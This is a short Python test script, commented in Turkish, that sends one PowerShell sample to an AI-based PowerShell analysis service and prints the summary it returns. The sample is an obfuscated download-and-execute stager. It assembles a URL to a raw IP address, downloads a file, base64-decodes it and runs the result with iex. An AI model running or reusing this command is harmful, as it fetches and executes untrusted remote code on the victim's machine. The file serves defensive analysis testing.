"""
PowerShell analiz servisini tam olarak test eden script.
"""
import asyncio
import sys
sys.path.insert(0, '.')

from services.powershell_intelligence import analyze_powershell_with_ai

# Kullanicinin ekran goruntusundeki PowerShell scripti
test_script = '$k = "H"+"T"+"T"+"P"+":"+"//91.231.89.208/p.txt"; $u = New-Object Net.WebClient; $b = $u.DownloadString($k); $c = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b)); if ($c) { iex $c }'

async def test():
    print("PowerShell AI analizi baslatiliyor...")
    print(f"Script: {test_script[:80]}...")
    print()
    
    result = await analyze_powershell_with_ai(test_script)
    
    ai = result.get("ai_summary", "AI SUMMARY YOK")
    print("=== AI SUMMARY ===")
    print(ai[:1500])
    print()
    print("=== RESULTS ===")
    print(result.get("results"))

asyncio.run(test())
